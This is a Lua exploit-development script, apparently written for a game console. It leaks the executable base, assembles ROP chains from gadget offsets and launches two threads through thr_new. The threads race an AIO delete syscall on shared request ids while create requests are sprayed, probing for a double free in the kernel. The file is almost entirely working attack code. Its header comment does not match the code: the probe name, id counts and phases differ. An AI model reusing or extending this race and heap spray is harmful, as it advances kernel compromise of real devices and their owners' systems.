-- CRASH_CLASS: HIGH
-- PROBE 523c: AIO delete race on native threads (fixed stack layout)
--
-- Context: 523a ran 300 iterations of three children racing one freshly
-- created id and always produced exactly one 0 and two 0x80020003: the
-- children start about a millisecond apart, so the losers fail at the FIRST
-- table lookup (slot already removed) and never overlap inside the delete's
-- unlock/re-lookup window. 523b/523c-v1 built long chains from rsp = top - 8
-- and died inside the first thr_new: a thr_new child starts at
-- stack_base + size and runs its chain UPWARD from there, so the chain must
-- live above the stack region, inside the same allocation
-- (docs/THREADING_ALIVE_14_10.md).
--
-- This probe first proves the layout with ONE child deleting 20 ids, then
-- launches TWO children that each delete the same 100 ids. If the delete's
-- post-unlock re-lookup loses the race, two children report status 0 for the
-- same id. Overlaps are printed as they are observed, so a crash after a hit
-- still leaves the evidence.

print("=== PROBE 602a: AIO RACE WITH CREATE SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end


local IDS = 64
local SPRAY_MAX = 600

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local ids_buf = memory.alloc(IDS * 4 + 64)
local poll_out = memory.alloc(0x40)
local cell = memory.alloc(16)

local function zero_data()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
end

local function create_polled()
    zero_data()
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end

print(string.format("[B] creating %d polled requests", IDS))
local made = {}
for i = 1, IDS do
    local id = create_polled()
    if id == nil then break end
    made[#made + 1] = id
    wd(N(ids_buf) + (i - 1) * 4, id)
end
print(string.format("    created=%d", #made))
if #made < IDS then print("    short create; aborting"); return end
if not alive() then print("DEAD while creating"); return end

local function build_child(first, count)
    local status = memory.alloc(count * 4 + 64)
    for i = 0, count * 4 - 4, 4 do wd(N(status) + i, 0xCCCCCCCC) end

    local CHAIN_MAX = 0x4000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + (first + i) * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(N(status) + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par, status, off
end

print("")
print(string.format("[C] launching two deleters over %d ids", IDS))
local pars, stats = {}, {}
for c = 1, 2 do
    local p, st, len = build_child(0, IDS)
    pars[c] = p; stats[c] = st
    print(string.format("    child %d chain bytes=%d", c, len))
end
for c = 1, 2 do
    local ok2, rv2 = pcall(function() return sc_thr_new(pars[c], uint64(0x38)) end)
    print(string.format("    launch child %d: ok=%s rv=%s alive=%s", c, tostring(ok2), tostring(N(rv2)), tostring(alive())))
end

-- [D] spray creates while the deleters run: each create makes a 0x30 context
print("[D] spraying creates during the race")
local sprayed = {}
local t0 = os.clock()
for k = 1, SPRAY_MAX do
    local id = create_polled()
    if id == nil then break end
    sprayed[#sprayed + 1] = id
end
print(string.format("    sprayed=%d", #sprayed))

-- [E] wait for the children
local spins = 0
while spins < 400000 do
    local done = true
    for c = 1, 2 do
        for i = 0, IDS - 1 do
            if rd(N(stats[c]) + i * 4) == -858993460 then done = false end
        end
    end
    if done then break end
    spins = spins + 1
end

local dbl, one, other = 0, 0, 0
for i = 0, IDS - 1 do
    local v1 = rd(N(stats[1]) + i * 4)
    local v2 = rd(N(stats[2]) + i * 4)
    local z = 0
    if v1 == 0 then z = z + 1 end
    if v2 == 0 then z = z + 1 end
    if z == 2 then dbl = dbl + 1 elseif z == 1 then one = one + 1 else other = other + 1 end
end
print(string.format("[F] two-zero=%d one-zero=%d neither=%d alive=%s", dbl, one, other, tostring(alive())))
if not alive() then print("DEAD after race"); return end

-- [G] health: delete the sprayed ids
local s_ok, s_gone, s_other = 0, 0, 0
for k = 1, #sprayed do
    wd(N(cell), sprayed[k])
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    local v = rd(N(poll_out))
    if v == 0 then s_ok = s_ok + 1
    elseif v == -2147024880 or v == 0x80020003 then s_gone = s_gone + 1
    else s_other = s_other + 1 end
end
print(string.format("[G] sprayed delete: ok=%d gone=%d other=%d alive=%s", s_ok, s_gone, s_other, tostring(alive())))
if not alive() then print("DEAD in health"); return end

-- [H] fresh cycles
local cyc_ok, cyc_bad = 0, 0
for k = 1, 8 do
    local id = create_polled()
    if id == nil then cyc_bad = cyc_bad + 1
    else
        wd(N(cell), id)
        wd(N(poll_out), 0xCCCCCCCC)
        pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
        local v = rd(N(poll_out))
        if v == 0 then cyc_ok = cyc_ok + 1 else cyc_bad = cyc_bad + 1 end
    end
end
print(string.format("[H] cycles ok=%d bad=%d alive=%s", cyc_ok, cyc_bad, tostring(alive())))
print("[Z] done")
